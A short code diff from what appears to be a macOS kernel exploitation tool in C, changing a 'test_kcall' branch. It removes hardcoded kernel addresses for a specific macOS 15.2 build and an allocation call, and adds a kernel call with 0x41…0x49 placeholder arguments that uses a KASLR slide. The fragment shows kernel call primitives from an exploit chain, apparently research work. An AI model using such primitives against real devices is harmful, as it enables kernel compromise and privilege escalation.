@@ -51,11 +51,7 @@ int main(int argc, char *argv[])
         INFO("proc: 0x%016llx", proc);
     } else if (argc == 2 && strncmp(argv[1], "test_kcall", strlen(argv[1])) == 0) {
         uint64_t proc = get_current_proc(sockfd);
-        // it's valid only for macOS 15.2 24C101 t6020
-        uint64_t kalloc_data_external = 0xFFFFFE0008785864;
-        uint64_t MALLOC_external = 0xFFFFFE0008E651EC;
-        uint64_t kmem = kcall(sockfd, 0xFFFFFE0008E651EC + kslide, 1, 0x4000);
-        INFO("kmem : 0x%016llx", kmem);
+        uint64_t _ = kcall(sockfd, 0x4141414141414141, 8, 0x4242424242424242, 0x4343434343434343, 0x4444444444444444, 0x4545454545454545, 0x4646464646464646, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949);
         // uint64_t kr = kcall(sockfd, getpid_addr, 3, proc, NULL, kmem);
         // assert(kr == 0);
 
